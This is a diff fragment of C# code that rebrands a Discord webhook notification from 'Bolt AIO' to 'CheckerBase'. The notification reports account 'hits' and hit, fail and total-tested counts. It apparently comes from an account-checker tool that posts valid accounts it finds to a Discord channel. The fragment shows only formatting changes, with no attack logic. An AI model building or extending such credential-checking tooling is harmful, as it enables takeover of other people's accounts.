@@ -33,15 +33,13 @@ namespace BoltPanel
             {
                 var json = JsonConvert.SerializeObject(new
                 {
-                    username = "Bolt AIO",
-                    avatar_url =
-                        "https://cdn.discordapp.com/attachments/708528132327735427/781294769375674378/Bolt_Logo.png",
+                    username = "CheckerBase",
                     embeds = new[]
                     {
                         new
                         {
                             description = $"[HIT] | {account} | {accountType}",
-                            title = "Bolt AIO",
+                            title = "CheckerBase",
                             color = "9396455",
 
                             footer = new
@@ -49,7 +47,7 @@ namespace BoltPanel
                                 icon_url =
                                     "https://cdn.discordapp.com/icons/781049455831023616/56dac6e51b6887b8d4a87ee724ba929a.webp?size=128",
                                 text =
-                                    $"[Bolt AIO] | [HITS] {Program.hits} - [FAILS] {Program.fails} - [TOTAL] {Program.totalTested}"
+                                    $"[CheckerBase] | [HITS] {Program.hits} - [FAILS] {Program.fails} - [TOTAL] {Program.totalTested}"
                             }
                         }
                     }
